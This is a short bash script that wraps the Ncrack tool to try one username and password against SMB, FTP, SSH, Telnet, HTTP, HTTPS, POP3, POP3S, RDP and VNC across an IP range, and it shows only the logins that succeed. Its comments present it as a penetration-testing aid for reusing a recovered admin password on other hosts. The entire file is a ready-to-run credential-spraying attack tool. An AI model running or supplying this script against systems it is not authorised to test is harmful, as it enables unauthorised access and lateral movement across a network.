#!/bin/bash

# NcrackALL multi-service multi-node brute force login script by bitfu
# https://keybase.io/bitfu
# https://twitter.com/bitfu_
# https://github.com/bitfu

# Try a single username/password combination against all supported services in an specified IP range.

# Example: during penetration tests to quickly try a recovered admin password against other services on the network
# Attempts FTP, SSH, TELNET, HTTP, HTTPS, POP3, POP3S, SMB, RDP, VNC

# Requirements:
# 1) Ncrack - see: https://nmap.org/ncrack

if [ -z "$3" ]; then
	echo "[*] NcrackALL multi-service multi-node brute force login script by bitfu"
	echo
	echo "[*] Usage: $0 <Username> <Password> <IP/Hostname/Network_Range>"
	echo "[*] Example: $0 admin password123 192.168.10.1-254"
	echo
	echo "[!] Output is non-verbose: Only valid logins are displayed"
	echo
	exit 0
fi

echo
echo "[+] Attempting $1/$2 on SMB services for targets: $3"
ncrack -v --user $1 --pass $2 smb://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on FTP services for targets: $3"
ncrack -v --user $1 --pass $2 ftp://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on SSH services for targets: $3"
ncrack -v --user $1 --pass $2 ssh://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on TELNET services for targets: $3"
ncrack -v --user $1 --pass $2 telnet://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on HTTP services for targets: $3"
ncrack -v --user $1 --pass $2 http://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on HTTPS services for targets: $3"
ncrack -v --user $1 --pass $2 https://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on POP3 services for targets: $3"
ncrack -v --user $1 --pass $2 pop3://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on POP3S services for targets: $3"
ncrack -v --user $1 --pass $2 pop3s://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on RDP services for targets: $3"
ncrack -v --user $1 --pass $2 rdp://$3 |grep "Discovered"
echo
echo "[+] Attempting $1/$2 on VNC services for targets: $3"
ncrack -v --user $1 --pass $2 vnc://$3 |grep "Discovered"
echo
echo "[!] END OF RESULTS"
echo
